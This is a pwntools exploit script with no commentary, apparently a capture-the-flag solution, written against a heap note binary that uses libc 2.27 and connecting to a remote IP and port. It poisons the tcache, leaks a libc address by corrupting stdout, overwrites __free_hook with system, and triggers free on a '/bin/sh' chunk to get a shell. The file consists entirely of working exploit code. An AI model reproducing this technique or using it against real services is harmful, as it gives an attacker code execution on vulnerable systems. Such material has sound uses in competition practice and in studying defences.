from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('Your choice :',str(ch))
def new(index,size,content):
	menu(1)
	p.sendlineafter('id:',str(index))
	p.sendlineafter('size:',str(size))
	p.sendafter('content:',content)
def edit(index,content):
	menu(2)
	p.sendlineafter('id:',str(index))
	p.sendafter('content:',content)
def free(index):
	menu(3)
	p.sendlineafter('id:',str(index))
def show(index):
	menu(4)
p = process('./main')
p = remote('122.112.225.164',10001)
libc =ELF('./libc-2.27.so')
for i in range(10):
	new(i,0xF0,'FMYY')
for i in range(8):
	free(0)
edit(0,'\x60\xF7')
new(10,0xF0,'FMYY')
new(11,0xF0,p64(0xFBAD1800) + '\x00'*0x18 + '\xC8')
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
edit(0,p64(0)*2)
free(0)
edit(0,p64(free_hook))
new(14,0xF0,'/bin/sh\x00')
new(15,0xF0,p64(system))
free(14)
p.interactive()
